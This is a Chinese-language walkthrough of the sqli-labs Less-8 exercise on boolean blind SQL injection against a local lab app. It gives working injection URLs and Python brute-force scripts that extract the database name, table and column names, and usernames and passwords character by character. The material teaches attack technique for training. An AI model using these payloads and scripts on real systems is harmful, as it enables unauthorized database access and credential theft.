## 练习开始
首先打开http://127.0.0.1/Less-8/?id=1

less-8是单引号 的盲注

![](README/EC7BD628-0286-492F-B623-AFEFA5B4238C.png)

核心语句是
```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

问题是这边已经不继续爆错了

测试用的payload
```
' and 's'='s' --+      返回正确内容
' and 's'='x' --+      返回错误的内容
```

1. 判断数据库长度
```
http://127.0.0.1/Less-8/?id=1' and length(database())=8 --+
```
当数值为8的时候返回正确
![](README/B3A3DE95-E614-4191-92C9-F84E79478EBE.png)

当数值为9的时候返回错误的信息
```
http://127.0.0.1/Less-8/?id=1' and length(database())=9 -- 
```

![](README/9B185AC5-857B-4A41-B477-ADEDEC769B15.png)

2. 判断数据库的名字
现在需要用到mysql自带的两个函数,ascii,substr
ascii函数的作用是将单一字符转换成ascii码的形式，而可打印字符 的范围是ascII码33--127
substr(string, index, num):是用来进行偏移转换的，从index字符开始，偏移num个字符，mysql中的index是从1开始的，而hibernate中的index是从0开始的。
database()是mysql自带的函数用来显示当前web使用的数据库
基本的语法就是
```
http://127.0.0.1/Less-8/?id=1' and ascii(substr(database(), 1,1))=108 -- 
```


![](README/3232479A-2E3B-4AE6-B8EE-E923DE1D3781.png)

用Python代码
```python

import requests

char_list = []

for i in range(1,9): #前期的测试已经证明数据库名字是8位字符
    for j in range(33, 128):
        burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20ascii(substr(database(),%20{index},1))={num}%20--+".format(index=i, num=j)
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        response = requests.get(burp0_url, headers=burp0_headers)

        if "You are in" in response.text:
            char_list.append(chr(j))
            break

print("".join(char_list))

```

![](README/8D6C46BB-0ED5-443B-9580-C3282DB98C9C.png)

3. 判断表的数量
```shell
http://127.0.0.1/Less-8/?id=1' and (select count(*) from information_schema.tables where TABLE_SCHEMA='security')=4 --+
```


![](README/D6808B89-65CA-43FC-9C18-0036B0F12260.png)
表的数量是4

4. 判读四个表的名字长度
示例
```
http://127.0.0.1/Less-8/?id=1' and (select length(table_name) from information_schema.tables where TABLE_SCHEMA='security' limit 0,1)=4 --+
```


代码
```python
import requests

for i in range(0, 4):

    for j in range(1, 20):

        burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20(select%20length(table_name)%20from%20information_schema.tables%20where%20TABLE_SCHEMA=%27security%27%20limit%20{index},1)={num}%20--+".format(index=i, num=j)
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        response = requests.get(burp0_url, headers=burp0_headers)

        if "You are in" in response.text:
            print(i, j)
            break
```


![](README/43BA1657-D16D-425E-B528-0A72F77A1CEA.png)

5. 判断表的名字
demo

```
http://127.0.0.1/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where TABLE_SCHEMA='security' limit 0,1),1,1)))=101 -- 
```

最后代码
```python
import requests

for i in range(0, 4):
    flag_list = []
    
    for j in range(1, 9):
        for k in range(33,128):

            burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20(ascii(substr((select%20table_name%20%20from%20information_schema.tables%20where%20TABLE_SCHEMA=%27security%27%20limit%20{index1},1),{index2},1)))={num}%20--+".format(index1=i, index2=j, num=k)
            burp0_headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

            response = requests.get(burp0_url, headers=burp0_headers)


            if "You are in" in response.text:

                flag_list.append(chr(k))
                break
    print("".join(flag_list))
```



![](README/FEC715DB-36CA-44EA-9BD9-0E204C91379A.png)

5. 判断数据库security的表users中的列的数量
```
http://127.0.0.1/Less-8/?id=1' and (select count(*) from information_schema.columns where TABLE_SCHEMA='security' and TABLE_NAME='users')=3 --+
```


![](README/5CE095B6-E659-441C-B00C-D42F402AF27E.png)

6. 判断columns的长度
```
http://127.0.0.1/Less-8/?id=1' and (select length(COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA='security' and TABLE_NAME='users' limit 0,1)=3 --+
```


```python
import requests


for i in range(0,3):
    for j in range(1,10):
        burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20(select%20length(COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=%27security%27%20and%20TABLE_NAME=%27users%27%20limit%20{index},1)={num}%20--+".format(index=i, num=j)
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        response = requests.get(burp0_url, headers=burp0_headers)

        if "You are in" in response.text:
            print(i, j)
            break
```


![](README/7D113DB5-C18A-4E24-95B2-C249D39833DB.png)

7. 判断列的名字

```
http://127.0.0.1/Less-8/?id=1' and (ascii(substr((select column_name from information_schema.columns where TABLE_SCHEMA='security' and table_name='users' limit 0,1),1,1)))=101 --+
```

```python
import requests


for i in range(0,3):

    flag_list = []

    for j in range(1,10):
        for k in range(33, 128):

            burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20TABLE_SCHEMA=%27security%27%20and%20table_name=%27users%27%20limit%20{index1},1),{index2},1)))={num}%20--+".format(index1=i, index2=j, num=k)
            burp0_headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            response = requests.get(burp0_url, headers=burp0_headers)

            if "You are in" in response.text:

                flag_list.append(chr(k))
                break

    print("".join(flag_list))
```


![](README/ED90FE5A-40CA-44B0-9FB4-3FA8226A8B8F.png)

8. last信息
判断列的数量
```
http://127.0.0.1/Less-8/?id=1' and (select count(id) from users)=8 --+
```

![](README/8A2ECCE3-B5B9-45E0-9577-FCF5D22F17E3.png)
八个内容

判断内容的长度

```
http://127.0.0.1/Less-8/?id=1' and (select length(username) from users limit 0,1)=1 --+
```

![](README/5DD3C2EA-6C73-4027-8168-50AAEC9F54D2.png)


判断username和password列八个字断的长度
```python
import requests

column_name = ["username", "password"]


for col in column_name:
    print(col)
    for  i in range(0,8):
        for j in range(1, 20):
            burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20(select%20length({col})%20from%20users%20limit%20{index},1)={num}%20--+".format(col=col,index=i, num=j)
            burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            response = requests.get(burp0_url, headers=burp0_headers)

            if "You are in" in response.text:

                print(i, j)
                break
```


![](README/D6657435-58AA-4411-B2C4-C6B1D2DCD972.png)


最后判断内容
```
http://127.0.0.1/Less-8/?id=1' and ascii(substr((select username from users limit 0,1),1,1))=68 --+
```

![](README/5CD0C247-7348-49F7-ADFE-479ADAAFF1FC.png)


```python
import requests


for i in range(1,5):
    for j in range(33,128):
        burp0_url = "http://127.0.0.1:80/Less-8/?id=1%27%20and%20ascii(substr((select%20username%20from%20users%20limit%200,1),{index},1))={num}%20--+".format(index=i, num=j)
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        response = requests.get(burp0_url, headers=burp0_headers)

        if "You are in" in response.text:
            print(chr(j))
            break

```


![](README/BDC6125B-2838-4023-8798-8DF2EA125158.png)